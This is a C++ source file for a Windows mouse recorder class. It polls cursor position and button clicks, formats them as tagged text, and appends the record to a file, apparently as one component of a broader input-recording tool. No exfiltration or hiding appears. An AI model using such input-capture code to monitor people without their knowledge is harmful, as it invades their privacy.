#include "stdafx.h"
#include "Mouse.h"

#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>

Mouse::Mouse()
	: IRecorder()
{
	POINT			position;

	start = std::time(NULL);
	if (GetCursorPos(&position))
	{
		lastPos[0] = position.x;
		lastPos[1] = position.y;
	}
	else
	{
		lastPos[0] = 0;
		lastPos[1] = 0;
	}
}

Mouse::~Mouse()
{

}

const std::string			Mouse::getCursorPos() const
{
	POINT					position;
	std::string				mouse;

	if (GetCursorPos(&position))
		mouse += std::to_string(position.x) + std::string(",") + std::to_string(position.y);
	return (mouse);
}

const std::string 			Mouse::getClicks() const
{
	std::string		click;
	int				i = 1;

	for (auto it = clickNames.begin(); it < clickNames.end(); it++)
	{
		if (GetAsyncKeyState(i) == -32767)
		{
			click += std::string("[Mouse:Click:") + *it;
			click += std::string(":") + this->getCursorPos() + std::string("]");
		}
		i++;
	}
	return (click);
}

const std::string 			Mouse::manageMoves()
{
	POINT					position;
	std::string				moves;
	time_t					now;

	if (GetCursorPos(&position))
	{
		if ((position.x != lastPos[0] || position.y != lastPos[1])
			&& (now = std::time(NULL)) - start > 1)
		{
			start = now;
			moves += "[Mouse:Move:";
			moves += std::to_string(lastPos[0]) + std::string(",") + std::to_string(lastPos[1]) + std::string(";");
			moves += std::to_string(position.x) + std::string(",") + std::to_string(position.y) + std::string("]");
			lastPos[0] = position.x;
			lastPos[1] = position.y;
		}
	}
	return (moves);
}

const std::string 		Mouse::readMouse()
{
	std::string			mouse;

	mouse = this->manageMoves();
	mouse += this->getClicks();
	return (mouse);
}

void					Mouse::read()
{
	std::string			mouse;

	if (!(mouse = this->readMouse()).empty())
		record += mouse;
}

void					Mouse::write(const std::string & filename)
{
	std::fstream		fs;
	
	fs.open(filename, std::fstream::out | std::fstream::app);
	fs << record;
	fs.close();
	record.clear();
	record = "";
}